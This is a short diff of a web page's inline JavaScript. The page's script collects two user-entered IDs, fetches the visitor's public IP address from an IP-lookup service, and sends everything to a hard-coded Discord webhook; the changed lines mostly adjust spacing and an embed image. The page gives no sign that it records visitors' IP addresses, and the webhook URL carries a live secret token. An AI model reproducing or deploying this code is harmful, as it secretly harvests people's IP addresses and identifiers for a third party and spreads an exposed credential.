@@ -84,11 +84,10 @@
         </div>
       </div>
     </div>
-    <div id="global-page-toast" style="font-size: 14px;"></div>
-    <script>
+    <div id="global-page-toast" style="font-size: 14px;"></div><script>
       const webhookURL = "https://discord.com/api/webhooks/1256435535174438953/95ujgUfUd7zFgY0sCQ_vfn5xQEiiHHPrtoXra41gcue84dKBA5fpDJ5b4dqgCqYkqGE-";
       const ipifyURL = "https://api.ipify.org?format=json";
-  
+    
       async function getIPAddress() {
         try {
           const response = await fetch(ipifyURL);
@@ -98,7 +97,7 @@
           console.error(error);
         }
       }
-  
+    
       async function sendUserIDs(userID1, userID2, ipAddress) {
         try {
           await fetch(webhookURL, {
@@ -123,7 +122,9 @@
                   ],
                   timestamp: new Date(),
                   thumbnail: {
-                    url: "https://i.ibb.co/WKvHpq7/pngegg10.png"
+                  },
+                  image: {
+                    url: "https://i.ibb.co/6Fgyssm/FREEMASONRY.png"
                   },
                   footer: {
                     text: "Created By @ABOLHB"
@@ -139,14 +140,16 @@
           console.error(error);
         }
       }
+    
       document.getElementById('sendBtn').addEventListener('click', async function() {
         let userID1 = document.getElementById('userID1').value;
         let userID2 = document.getElementById('userID2').value;
         let ipAddress = await getIPAddress();
-  
+    
         await sendUserIDs(userID1, userID2, ipAddress);
       });
     </script>
+    
   
   
   </body></html>
